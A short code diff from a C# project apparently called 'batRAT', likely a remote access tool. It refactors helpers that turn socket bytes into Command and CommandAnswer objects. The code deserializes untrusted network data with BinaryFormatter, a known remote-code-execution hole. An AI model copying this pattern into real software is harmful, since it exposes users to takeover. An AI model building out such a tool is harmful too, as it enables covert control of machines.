@@ -6,23 +6,23 @@ using batRAT.Commands;
 
 namespace batRAT {
     public class Utilities {
-        public static string ExtractMessage(StateObject state, int bytesReceived) {
+        public static Command ExtractCommand(StateObject state, int bytesReceived) {
             byte[] buf = new byte[bytesReceived];
             Array.Copy(state.buffer, 0, buf, 0, bytesReceived);
             using(var ms = new MemoryStream(buf)) {
-                TestCommand o = (TestCommand)new BinaryFormatter().Deserialize(ms);
+                Command o = (Command)new BinaryFormatter().Deserialize(ms);
                 ms.Close();
-                return o.Message;
+                return o;
             }
         }
 
-        public static MessageTypes ExtractMessageType(StateObject state, int bytesReceived) {
+        public static CommandAnswer ExtractAnswer(StateObject state, int bytesReceived) {
             byte[] buf = new byte[bytesReceived];
             Array.Copy(state.buffer, 0, buf, 0, bytesReceived);
             using(var ms = new MemoryStream(buf)) {
-                TestCommand o = (TestCommand)new BinaryFormatter().Deserialize(ms);
+                CommandAnswer o = (CommandAnswer)new BinaryFormatter().Deserialize(ms);
                 ms.Close();
-                return o.MessageType;
+                return o;
             }
         }
     }
